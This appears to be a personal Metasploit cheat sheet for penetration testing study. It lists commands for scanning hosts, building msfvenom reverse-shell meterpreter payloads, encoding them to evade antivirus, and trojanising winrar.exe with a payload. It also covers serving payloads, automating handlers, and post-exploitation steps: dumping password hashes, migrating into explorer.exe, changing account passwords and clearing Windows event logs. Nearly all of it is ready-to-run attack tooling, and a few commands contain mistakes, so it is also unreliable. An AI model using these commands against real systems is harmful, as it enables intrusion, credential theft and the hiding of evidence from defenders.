# service postgresql start & msfconsole 


- __`search type:auxiliary name:smb`__
- __`db_import /root/result`__
- __`db_nmap -A -Pn -T4 ,ip.`__
- __`hosts`__
- __`services`__

## using load wmap in msfconsole

- __`load wmap`__
- __`wmap_sites -h`__
- __`wmap_sites -a <target_ip>`__
- __`wmap_targets -h`__
- __`wmap_targets -t http://<target_ip>`__
- __`wmap_sites -l`__
- __`wmap_run -h`__
- __`wmap_run -t`__
- __`wmap_vulns -h`__
- __`wmap-vulns -l`__

### msfvenom
- __`msfvenom --list payloads`__
##### Windows payload
- __`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -f exe > /home/kali/Desktop/payloadx86.exe`__
- __`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -f exe > /home/kali/Desktop/payloadx64.exe`__
##### Linux payload
- __`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -f elf > ~/Desktop/payloadx86`__
- __`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -f elf > ~/Desktop/payloadx64`__
  - > __we have create a payload and now we should set the listern in msfconsole__
  - __`use multi/handler`__
  - __`set payload windows/meterpreter/reverse_tcp`__
  - __`exploit`__


### Encoding Payloads with Msfvenom
##### Windows
- __`msfvenom --list encoders`__
- __`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -e x86/shikata_ga_nai -f exe > ~/Desktop/payloadx86.exe`__
- __`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/payloadx86.exe`__
  - __`-i` iterations__
  - __`-e` endcode__

##### Linux
- __`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/payloadx86`__


### Injecting Payloads into windows Portable Executables
- __`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<yourip> LPORT=4444 -i 10 -e x86/shikata_ga_nai -f exe -x winrar.exe > ~/Desktop/payloadx86.exe`__
  - __`-x` injecting payload__

- __`sudo python -m SimpleHTTPServer 80`__
```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <youip>
set LPORT 4444
exploit
```

### Automating Metasploit with Resource Scripts
  - __create a file handler.rc__
    - __`nano handler.rc`__
  - __writing the command that you want to automat__
    ```use multi/handler set payload windows/meterpreter/reverse_tcp set LHOST <yourip> LPORT 444 exploit```
  - __`msfconsole -r handler.rc`__
    - __it will run automatically without typing__

  - __can do this form the msfconsole also__
    - __`resource ~/Desktop/handler.rc`__
    - __we have one more option called `makerc`__
      - __`makerc` will save the pervious command in .rc file that you entered in the msfconsole__
        - __`makerc /home/kali/Desktop/protscan.rc`__
# For linux
- __`getuid`__
- __`getenv PATH`__
- __`getenv TERM`__
- __`search -d /usr/bin -f *backdoor*`__
- __`search -f *.jpg`__
- __`search -f *.php`__

# For Windows
- __`show_mount`__
- __`ps`__
- __`migrate explorer.exe`__
- __`pgrep explorer.exe`__
- __`hashdump`__
__Down below command are for the windows target system after login using meterpreter using shell__
  - __`net users`__
  - __`net localgroup administrators`__
  - __`net localgroup administrators password123` Changing passoword__
- __you can clear all the logs in the windows target system__
  - __type the below command in meterpreter__
  - __`clearev`__
 
__displaying mounted drive in windows system__
  - __`show_mount`__


